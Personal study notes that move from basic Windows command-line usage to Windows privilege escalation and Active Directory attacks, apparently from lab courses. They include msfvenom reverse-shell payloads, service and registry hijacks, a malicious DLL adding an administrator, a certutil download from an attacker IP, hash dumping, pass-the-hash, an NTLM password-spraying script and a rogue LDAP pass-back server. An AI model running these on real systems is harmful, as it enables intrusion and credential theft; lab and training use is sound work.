-------------------

### Learning Windows

-------------------

### Javac 

- `javac <file.java>` to compile a java file
- `java <file.java>` to run the file

### Displaying file contents

Use:
- `more <file name>`
- `type <file name>`

### Exit a terminal with

- `exit`


| **Commands**     |  **syntax**             |    **Actions**        |
|------------------|-------------------------|-----------------------|
|    dir           |    `dir`                |  List a directory     |                
|   cd             |   `cd <directory`       |  Change directory     |
|   cd ..          |   `cd ..`               | Move up a directory   |
|   move           |   `move file file`      | Move a file           |
|   copy           |  `copy file file`       | Copy a file           |
|   del            |   `del <file name>`     |  Delete a file        |  
|   mkdir          | `mkdir <directoryname>` | Make a directory      |

### Redirecting output

- Use `>` and `<`, Linux logic appplies to it,the same with  piping `|`


### Running a cmd shell as admin

- `powershell start cmd  -v runAs`

### Checking list of drivers

- `driverquery`

### Show your PC's details

- `systeminfo`

### Environmental Variables

- `set`

### Prompt

- To change your default text

 ![image](https://github.com/user-attachments/assets/2ee8b3d5-2f3a-47dd-aa3e-0e18548b41d8)

- use `prompt <what you want to do> $G`
- To revert, use `prompt`

### To copy to clipboard

- Just pipe the output of a file to clip e.g `dir | clip`

### Listing files and their extensions

- Use `assoc`

### Changing your cmd title window

- Use `title cmdbaby`

### Comparing 2 files

- Use `fc <file1> <file2>`

### Using `cipher`

- On a PC, deleted files remain accessible to you and other users. So, technically, they are not deleted under the hood.

   `cipher`

### Checking open ports, ip and states

- Use `netstat -an`

### shutdown a system
- Use `shutdown`
- `shutdown /r` will restart a system

### Clear a system shell

- Use `cls`

### Exit cmd

- Use `cmd`

### Rename a file

- use `ren <filename1> <filename2>`

### Creating a file

- use `echo <words> > filename.txt`

### Use `-help` to show a guide on  list

- `powercfg -help`

### To run the Deployment Image Service Management Tool

- Use `dism`

### Show the Serial Number and Label Info of the Current Drive

- Use `vol`

### Pinging an address

- Use `ping <addr>`

### Changing the terminal's color

- Use `color attr` to check a color's index
- use `color <number>` to change color

### Checking a wifi's password

- Use `netsh wlan show profiles` to check wifis previously connected to
- Then,`netsh wlan show profiles name="<wifi's name>" key=clear`

### Using `ipconfig` to check the machine's ip address

- run `ipconfig`
- This command also has extensions such as `ipconfig /release`, `ipconfig /renew`, and `ipconfig /flushdns` which you can use to troubleshoot issues with internet connections

### System file checker `sfc`

- Use `sfc /scannow` to check for corrupt files and repair them
  
### `Powercfg`
  You can use this command with its several extensions to show information about the power state of your PC. 

- `powercfg /energy` to generate a battery health report

### Starting a web address

- use `start <web addr>`

### Showing the tree of the current directory

- Use `tree`

### Os version

- Use `ver`

### Show open programs

- Use `tasklist`

### Killing open programs

- use `taskkill /IM "<program>" /F` to kill a program

### Showing date, time

- Use `date` to show data
- Use `time` to show time

 
------------------------------

### REFERENCES:

- [Freecode camp](https://www.freecodecamp.org/news/command-line-commands-cli-tutorial/)

------------------------------

 
### Understanding Windows

### COnnecting to a remote desktop protocol, use `remmina` on linux 

![image](https://github.com/user-attachments/assets/914044ec-5759-49a0-b26e-7d81e24b40a6)

- Enter ip

![image](https://github.com/user-attachments/assets/a27b0ae2-64e2-4b51-8e7e-a5cd2e56ecca)

- Enter credentials


### Troubleshooting with Msconfig
  
  The System Configuration utility (MSConfig) is for advanced troubleshooting, and its main purpose is to help diagnose startup issues. 

- Use `windowskey + r` ,type `msconfig`

![image](https://github.com/user-attachments/assets/a6c81d7d-cdd4-422e-82e5-7316071f1650)

- Type `taskmgr to run the `task manager` get programs and background processes

![image](https://github.com/user-attachments/assets/83bd7c79-4909-4ce4-bb70-c6648443f897)

### Computer management

The Computer Management (compmgmt) utility has three primary sections: System Tools, Storage, and Services and Applications.

- Type `compmgmt.msc` in the `windowskey + r` dialog box
- The task scheduler is used to enable tasks at startup

![image](https://github.com/user-attachments/assets/0ab80421-0ccf-447d-a983-26205b412b12)

- Event viewer allows us to acccess logs of events hat occurred while using the system

![image](https://github.com/user-attachments/assets/b9a71b7f-e8df-4a18-a720-3bd51621324c)

- Shared folders shows shares or folders that users can have access to

![image](https://github.com/user-attachments/assets/67f17e12-3223-4885-8eb2-418dc68a9eaa)

- Checking `Local Users and Groups`, use `lusrmgr.msc` or check here

![image](https://github.com/user-attachments/assets/851f4af3-f32e-4f55-a017-26b326299fa8)

- Monitoring performance, use `perfmon.exe` or check

![image](https://github.com/user-attachments/assets/38a00f65-1080-421b-b9f5-b62de196e0ed)


### System Information

 - Windows includes a tool called Microsoft System Information (Msinfo32.exe).  This tool gathers information about your computer and displays a comprehensive view of your hardware, system components, and software environment, which you can use to diagnose computer issues

- The system information tab contains the `Environmental variables`.Environment variables store information about the operating system environment. This information includes details such as the operating system path, the number of processors used by the operating system, and the location of temporary folders.The environment variables store data that is used by the operating system and other programs. For example, the WINDIR environment variable contains the location of the Windows installation directory. Programs can query the value of this variable to determine where Windows operating system files are located.

![image](https://github.com/user-attachments/assets/5a841594-c065-4572-b54f-fd69176ceda1)

### Monitoring Resource

- The application  is known as `Resource Monitor` and the executable is `resmon.exe`.Resource Monitor displays per-process and aggregate CPU, memory, disk, and network usage information, in addition to providing details about which processes are using individual file handles and modules. Advanced filtering allows users to isolate the data related to one or more processes (either applications or services), start, stop, pause, and resume services, and close unresponsive applications from the user interface. It also includes a process analysis feature that can help identify deadlocked processes and file locking conflicts so that the user can attempt to resolve the conflict instead of closing an application and potentially losing data

![image](https://github.com/user-attachments/assets/0752dccc-96d7-43f1-afb0-fefa3aca77c4)


### Registry Editor [regedit.exe]

It is an hierarchical database used to store information necessary to configure the system for one or more users, applications, and hardware devices.

- One way to use regedit is `regedit` or `regedt32`.

  ![image](https://github.com/user-attachments/assets/12c25d18-9c07-453e-af44-40c365808f5e)


### Windows Privesc

- Connecting to rdps with `xfreerdp`

      xfreerdp /u:<user> /p:<password> /cert:ignore /v:<host>

### Generating and sending  revshells

- Generating a windows reverse shell executable

      msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your ip> LPORT=<listening port> -f exe -o saucy.exe

- Setting up an smb server with python impacket

      python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

- Copy to the machine

      copy \\<your ip>\kali\<filename> <folder to send to>


### Abusing User's permissions

- To check a user's permission,use `accesschk.exe`

      accesschk.exe /accepteula -uwcqv user <service>

![image](https://github.com/user-attachments/assets/4b9a5bc3-af80-4f15-b6be-82f5b9be749c)

- Check if a binary runs with SYSTEM privileges

      sc qc [service name]
- Modify the config path to our reverseshell's path

      sc config [service name] binpath="\"<reverseshell path>\""

- Then net start `service name` to trigger it

![image](https://github.com/user-attachments/assets/1fa7dbed-e1de-4aa8-9bdb-44ded59ec6a2)

### Unquoted path services

- Exploiting services with unquoted paths

![image](https://github.com/user-attachments/assets/5115d234-5fe0-4daf-af3a-756660097559)

- Use `accesschk /accepteula -uwdq "[service name]"` to check for the user privileges

  ![image](https://github.com/user-attachments/assets/866a466f-3d86-4399-bb13-8087489395e6)

- Copy to the directory and rename with `Common.exe`

      copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

- use `net start [service}` to start shell.


### Weak Registry Permissions

- Write registry access can allow an attacker overwrite the image path registry key of a service . In this case service `regsvc` is vulnerable, group `NT AUTHORITY/INTERACTIVE` can overwrite registry Imagepath.

Command-:```accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc```

![image](https://github.com/user-attachments/assets/6a9b85dd-c13d-4760-85e9-436cbbad8ba8)

- Overwrite the image path

Command-:```reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f```

- Then, use `net start regsvc` to start revshell

![image](https://github.com/user-attachments/assets/efcddbb2-7a35-4bbf-a8f6-7d01cb1b9bfd)


### Insecure Service Executables

- An attacker can swap a services's binary executable with system privileges if it is writable by everyone.

![image](https://github.com/user-attachments/assets/fc1972d0-a859-41b7-9c17-e60c52d5061e)

- Copy and replace the binary with

`copy [path] [path] /Y`

- Start the service with `net start filepermsvc


### Registry Autoruns

- Query with `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` to query the registry for Autorun executables

![image](https://github.com/user-attachments/assets/e1d92284-a179-4105-9407-9a4821568a8d)

- Query with accesschk to see if it is writable by everyone

  Command-: ```C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"```

![image](https://github.com/user-attachments/assets/9d38a137-2369-456b-aeac-99ef3b93ffd4)

- Copy your reverse shell executable to the autorun executable path

- You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves


![image](https://github.com/user-attachments/assets/19321af4-8ba3-427d-afba-12c00530e99f)

### Using rdesktop to login to rdp

- Use `rdesktop -u [user] [ip]`
  

### Generating an msi payload with msfvenom

- Use:
  
      msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT=[port] -f msi -o saucy.msi

![image](https://github.com/user-attachments/assets/2de086ab-a240-46df-b9b9-55baa9f1bde7)

### Registry AllElevated Keys

-  AlwaysInstallElevated" is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the "AlwaysInstallElevated" registry key is configured with a value of "1" in the Windows Registry.
When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn't have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.

- To check this, use query `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` to check if the value is set to `1` or `0x1`.

![image](https://github.com/user-attachments/assets/e659baaa-85d0-45cf-ae60-a123bd769fa6)

- Copy the msi payload and install with msiexec to trigger a reverse shelll

      msiexec /quiet /qn /i [msi's path]

- Shell

![image](https://github.com/user-attachments/assets/d8b07ea9-8e38-4e1f-a47f-4e2fb3497097)


### Saved passwords

- You can query registry for saved password

      reg query HKLM /f password /t REG_SZ /s

- or query to find admin AUTOLOGON credentials

      reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

- Spawn a cmd with admin privilege with `winexe`

      winexe -U '[user]%[password]' //[ip] cmd.exe

 ![image](https://github.com/user-attachments/assets/d1dedfcb-0c29-4d1d-8326-8de66e43a93f)

       
### Paaswords- Security Acount Manager (SAM)

- The SAM and SYSTEM files can be used to extract user password hashes
- Copy it to your machine

![image](https://github.com/user-attachments/assets/54334d3b-cc07-4119-83cd-f372acd2db77)

- Install credump7 to dump the hashes

      git clone https://github.com/Tib3rius/creddump7
      pip3 install pycrypto
      python3 creddump7/pwdump.py SYSTEM SAM

- Dump the hashes with pwdump.py

![image](https://github.com/user-attachments/assets/197fbbb0-c037-4ef0-b2db-62af6d48163d)

- Crack the NTLM(New Technology Lan Manager) hash with john

![image](https://github.com/user-attachments/assets/d9316e5c-d530-4b5c-a4e9-b0e2f2ebf4ca)

### Cracking with Hashcat

- Command-:``` hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt```

![image](https://github.com/user-attachments/assets/f1705fa8-15dc-4af9-b568-63210da6e1a1)

- Hashes result

![image](https://github.com/user-attachments/assets/d6f84f35-894d-4a50-93ab-b33ca79b9f45)


### Passing the hash

- You can use the hash to login instead of cracking the password,use `pth-winexe`

       pth-winexe -U "admin%[hash]" //[ip] cmd.exe

- Remember that the hash contains both the LM and NTLM hash seperated by colon

![image](https://github.com/user-attachments/assets/4ee7eeb2-ee1f-471d-9ba7-74cddfaa4f2d)

### Scheduled tasks

- An attacker can abuse a scheduled process running a script running as `SYSTEM` with write access.

![image](https://github.com/user-attachments/assets/59704788-9e65-4a01-a962-8fd5749966ce)

- Append a line that trigger our reverse shell

![image](https://github.com/user-attachments/assets/78abb9ec-d07f-43e7-be1a-5bc2b453dcd2)

- Reverse shell

![image](https://github.com/user-attachments/assets/fbc57a9b-54f1-49ac-88a3-ff9c37520e40)

### Insecure GUI apps

- Abusing `mspaint.exe`
- Double-click on the adminpaint shortcut
- Run this `tasklist /V | findstr mspaint.exe` to see if it is running with admin privileges

![image](https://github.com/user-attachments/assets/9284c76e-9c6a-4b6c-bcb9-fc1472de2c01)

- Click `file` and `open`.then paste this:`file://c:/windows/system32/cmd.exe`

![image](https://github.com/user-attachments/assets/321fe040-b73a-407a-a30c-c0294b50e1bf)

- Press enter to spawn a command prompt with admin privileges


### TOKEN IMPERSONATION-Rogue Potato

- Set up a socat redirector redirecting traffic from a port on your machine to another port on the victim machine

      sudo socat tcp-listen:[listening port],reuseaddr,fork tcp:[target-ip]:[port]

- Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account.

      C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

![image](https://github.com/user-attachments/assets/bfd711a0-b618-4bec-86b8-11367034372f)

- Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

      C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999

- System shell

### Token Impersonation - PrintSpoofer

- Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:

      C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
- Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

       c:\PrivEsc\PrintSpoofer.exe -i -c [rev shell's path]
  
![image](https://github.com/user-attachments/assets/980e676e-705f-4d15-9248-74d2c32f56d8)

- Use `whoami /priv` to check for privileges

![image](https://github.com/user-attachments/assets/baf8ab23-fbd5-408d-9eb4-2e5e967d324d)

- Privilege Escalation automation scripts

   - winPEASany.exe
   - Seatbelt.exe
   - PowerUp.ps1
   - SharpUp.exe



### OFFSEC
### Windows Access Control

- Privileges on the Windows Operating System refers to permissions of a specific user to perform system related local operations.e.g add users, modifying file system.

### Concepts

- Server Identifier `[SID]`
- Mandatory Integrity Control
- User Access Control
- Access Token

### Server Identifier

- A `SID` is a unique value assigned to a group and user and authenticated by windows.In the case of `users` and `groups`, it is generated by `Local Security Authority` while Doamin users and groups are created by the domain controller.The SID is generated when the user is creted and cannot be tampered with.
- A SID is represented by letters SRXY and `-` acts a delimeter

```S-R-X-Y```

- Literal `S` indicates that the string is an SID
- Literal `R`stands for `revision` and that the overall SID structure is at its initial version
- “X” determines the identifier authority. This is the authority that issues the SID. For example, “5” is 
the most common value for the identifier authority. It specifies NT Authority and is used for local 
or domain users and groups.
- “Y” represents the sub authorities of the identifier authority. Every SID consists of one or more sub 
authorities. This part consists of the domain identifier and relative identifier (RID). The domain 
identifier is the SID of the domain for domain users, the SID of the local machine for local users, 
and “32” for built-in principals. The RID determines principals such as users or groups.

## Example of a SID

```S-1-5-21-1336799502-1441772794-948155058-1001```

- Relative identifiers start with 1000.RID `1001` will be for the second user created on the server.
- There are SIDs that have a RID under 1000, which are called well-known SIDs.These SIDs identify generic and built-in groups and users instead of specific groups and users.

      S-1-0-0 Nobody 
      S-1-1-0 Everybody
      S-1-5-11 Authenticated Users
      S-1-5-18 Local System
      S-1-5-domainidentifier-500 Administrator

### ACCESS TOKEN
- Once a user gets authenticaed by Windows,a token gets generated with set of attributes which limits the type of operation carried out by the user.
- When a user starts a process or thread, a token will be assigned to these objects. This token, called a primary token, specifies which permissions the process or threads have when interacting with another object and is a copy of the access token of the user
- A thread can also have an impersonation token739 assigned. Impersonation tokens are used to provide a different security context than the process that owns the thread. This means that the thread interacts with objects on behalf of the impersonation token instead of the primary token of the process.

### Mandatory Access Control

- It uses integrity levels to determine control access to securable objects.When processes are started,they receive the integrity levels of the principal while performing the operations.
- Processes run on 4 integrity levels

      System: SYSTEM (kernel, ...)
      High: Elevated users
      Medium: Standard users
      Low: very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data

### User Access Control

- UAC is a Windows security feature that protects the operating system by running most applications and tasks with standard user privileges, even if the user launching them is an Administrator. For this, an administrative user obtains two access tokens after a successful logon. The first token is a standard user token (or filtered admin token), which is used to perform all non-privileged operations. The second token is a regular administrator token. It will be used when the user wants to perform a privileged operation. To leverage the administrator token, a 
UAC consent prompt needs to be confirmed.

### SITUATIONAL AWARENESS

- This involves understanding  the nature of the windows system to identify potential vectors for privilege escalation.
- Important stuffs to check  are:

  - Username and hostname
  - Group memberships of the current user
  - Existing users and groups
  - Operating system, version and architecture
  - Network information
  - Installed applications
  - Running processes

### Groups

- Use `whoami /GROUPS` to display the groups that the current user is a member of

### Users

- The next piece of information we are interested in are other users and groups on the system. We can use the `net user` command or the Get-LocalUser Cmdlet to obtain a list of all local users. Let’s use the latter by starting PowerShell and running Get-LocalUser

```bash
  powershell
  Get-LocalUser
```
### Enumerating Local Groups

- Use command `net LocalGroup` or `Get-LocalGroup` in powershell

### Examples of groups

- Members of Backup Operators can backup and restore all files on a computer, even those files 
they don’t have permissions for.
- Members of Remote Desktop Users can access the system with RDP, while members of Remote 
Management Users can access it with WinRM.

### View the members of a group with `Get-LocalGroupMember`

- Syntax-: ```Get-LocalGroupMember <Group's name>```

### Check the operating system, version, and architecture

- Use `systeminfo`

### Identify network interfaces, routes andactive network connections

- To list all network interfaces,use `ifconfig /all`
- To display the routing tables, use `route print`
- To list all active network connections we can use netstat753 with the argument -a to display all active TCP connections as well as TCP and UDP ports, -n to disable name resolution, and -o to show the process ID for each connection.Use `netstat -ano`

### Checking installed applications on a system

- For 64-bit and 32-bit applications , use

      Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"  | select displayname
       Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  

- Finding running processes, use powershell `Get-Process` cmdlet
- The listed processes might not be complete.Check for files in the `c:/` directory      



### Upgrading a shell to meterpreter

- Use

      use multi/manage/shell_to_meterpreter
      set SESSION 1
      set PAYLOAD_OVERRIDE windows/meterpreter/reverse_tcp
      set PLATFORM_OVERRIDE windows
      set PSH_ARCH_OVERRIDE x64

- Search for `search_to_meterpreter` with `search <keyword>`

![image](https://github.com/user-attachments/assets/3d6e3cb1-ba21-4fa1-a890-f2d729f60129)

- Type, `use 0` or `use <keyword>`

![image](https://github.com/user-attachments/assets/5eebe888-3445-4e08-8f1f-465fddbd6560)

- Use options to show options

![image](https://github.com/user-attachments/assets/b5a65c68-5508-457f-9117-a854cd2a6a82)

- Then,check for sessions with `sessions -i`

![image](https://github.com/user-attachments/assets/6b32651e-062f-4436-adba-7850146aaf24)

- RUn

![image](https://github.com/user-attachments/assets/918845c9-68fb-4d27-9c9e-a03df77f8e24)

### Using Msfconsole Hashdump rb script

- Shell must be a meterpreter shell,run `search "hashdump"` to search for hashdump and follow the process in a picture

![image](https://github.com/user-attachments/assets/35ad8d4e-a149-4bb4-a1ca-191e3908dd03)

- Result

![image](https://github.com/user-attachments/assets/bc8f3974-c833-4df7-ab61-bd5081fb4f26)

- Use `john` to crack the hash

      john --format=NT --wordlist=/home/sensei/rockyou.txt hashfile

![image](https://github.com/user-attachments/assets/b84b14f0-afde-4068-9c41-4aad6dbf3aa5)


--------------

### Using `certutil.exe` to copy files

`certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe`

--------------

### Abusing autoruns

- Run `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe` in cmd to check for `logon` autorun

![image](https://github.com/user-attachments/assets/df520e32-7cce-4f44-9348-19338d37fc80)

- Use `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program\program.exe" to check for permission.

![image](https://github.com/user-attachments/assets/f57d8100-6e70-4949-9bc4-1a9dd3d8a7d0)

- We have write access to the file,I exploited it by copying a revshell to replace it.

---------------

### Copying files to the attack machine

- Use

`copy <file> \\<ip>\<share>`

![image](https://github.com/user-attachments/assets/54e50dd4-507b-49c2-a60a-3a17484183ac)


### DLL Hijacking

- Open `Process Monitor` and check for a program missing a dll
- Create a malicious dll with `x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme2.dll`

 ![image](https://github.com/user-attachments/assets/84c362fa-f3fa-47ab-9f39-a47c1dedc4a8)


- Copy the malicious dll to the location.

![image](https://github.com/user-attachments/assets/0e864d2f-9c76-4609-929a-2fedb9636b86)

- Then,use `sc` to start the service with `sc start <service>`.You can stop a service with `sc stop <service>`.

![image](https://github.com/user-attachments/assets/ee609183-86c9-4828-90db-0871fb1ddedb)

- Malicious code for the dll

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```
-------------------------

### Hot Potato exploitation for windows 7

![image](https://github.com/user-attachments/assets/25885a6e-ee43-4254-bd61-ca3e95858c89)

- Process-:
  - `powershell.exe -nop -ep bypass`
  - Import the `tater.ps1` script `Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1`
  - Execute a command with the imported module `Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"`

- Check if it worked by running `net localgroup administrators`

![image](https://github.com/user-attachments/assets/4e388732-fed2-4187-9eb1-af7b07b79824)

-------------------------

### Reference-:

- [Tater's script repo](https://github.com/Kevin-Robertson/Tater)

-------------------------

### Password Mining Escalation - Memory

- Open command prompt and type: msfconsole
- In Metasploit (msf > prompt) type: use auxiliary/server/capture/http_basic
- In Metasploit (msf > prompt) type: set uripath x
- In Metasploit (msf > prompt) type: run

![image](https://github.com/user-attachments/assets/e5a34e1c-9a09-4b5a-bdf9-8526c3df4d33)

- Load the basic http site on internet explorer `iexplore.exe`

![image](https://github.com/user-attachments/assets/3e29ed28-18ac-421b-8c52-ca2b035095a9)

- Go to taskmgr `taskmgr.exe` and create a dump

![image](https://github.com/user-attachments/assets/3a4e8821-5d2e-4fc8-9ed3-a45bbd234403)

- Copy the dump and grep for `Authorization: Basic`



### AD Cheatsheet

[HTB](https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide)

-------------------------

### Learning AD exploitation

-------------------------

### DNS setting in Network Configuration

![image](https://github.com/user-attachments/assets/0ed25f47-948d-401a-86c9-39939b5b519f)

Remove 8.8.8.8

- Then, use `systemctl restart NetworkManager` to restart networkmanager


![image](https://github.com/user-attachments/assets/71c18d06-828f-4091-88df-4100e56fdd0b)

![image](https://github.com/user-attachments/assets/8432cd08-493b-4692-a414-0699e1065797)

- Services applying NTLM can sometimes be facing the internet e.g

```python3
    Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
    Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
    Exposed VPN endpoints that were integrated with AD.
    Web applications that are internet-facing and make use of NetNTLM.
 ```
- Script from thm to bruteforce credentials

```
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)



if __name__ == "__main__":
    main(sys.argv[1:])
```

- Syntax-:

![image](https://github.com/user-attachments/assets/52714f8e-8a3a-434a-94cf-681784bf70de)

### LDAP Bind Credentials

- LDAP auth is similar to NTLM AYTH,the application directly verifies the user's crenetials.The application has a set of creds that it uses to verify the AD user's creds.Although, non-microsoft applications that integrates wuth AD uses it. e.g
 - Gitlab
 - Jenkins
 - Custom-developed web applications
 - Printers
 - Vpns

- If this services are exposed to the internet,the same attacks leveraged on NTLM can be applied.Although, it opens up an additional attack to to grab the credentials to gain authenticated access to AD.

- Authentication process

![image](https://github.com/user-attachments/assets/f13bbc4b-c220-4018-9115-d3840e6b9590)

### LDAP Pass-back Attacks

- LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Usually, the credentials for these interfaces are kept to the default ones, such as admin:admin or admin:password. Here, we won't be able to directly extract the LDAP credentials since the password is usually hidden. However, we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.

- Netcat cannot be used to grab the creds.We need to create a rogue server.
- Use binary slapd to create a rogue server.TO install,use

```bash
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
#You will however have to configure your own rogue LDAP server on the AttackBox as well. We will start by reconfiguring the LDAP server using the following command:
sudo dpkg-reconfigure -p low slapd
```

- Config process,use

`sudo dpkg-reconfigure -p low slapd`

- Follow the process below

![image](https://github.com/user-attachments/assets/f28c0ec8-fb39-45ce-8d20-03ad15f07d9d)

![image](https://github.com/user-attachments/assets/b7d6542b-f161-46cc-8f4e-3d64da7ccfa8)

![image](https://github.com/user-attachments/assets/4f0a82ca-ee0b-4fb8-8b8e-fb7e09988dd2)

![image](https://github.com/user-attachments/assets/5964b8e8-cf73-43a9-b84d-b86d70d214e2)

![image](https://github.com/user-attachments/assets/7123846c-7ba5-40f1-8093-663a87f570ae)

![image](https://github.com/user-attachments/assets/3188414d-c7d1-4dea-b554-53f0238d29c3)

- Set the server to recieve plain LOGIN credentials with an `ldif` file.

```ldif
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```
- Config meaning
  
    olcSaslSecProps: Specifies the SASL security properties
    noanonymous: Disables mechanisms that support anonymous login
    minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.

- Path up the server with the command below

      sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

- Verify the credentials settings with

      ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms

![image](https://github.com/user-attachments/assets/2d76c37b-99d3-4c62-80b0-f98834e167f3)

- Now, use `tcpdump` to  sniff packets

![image](https://github.com/user-attachments/assets/a2b0fb03-ce71-457c-8140-22a5b489e59e)

![image](https://github.com/user-attachments/assets/f904eee5-b731-4bb1-a108-e3d31d78258f)


### AUTHENTICATION RELAYS





























  









  











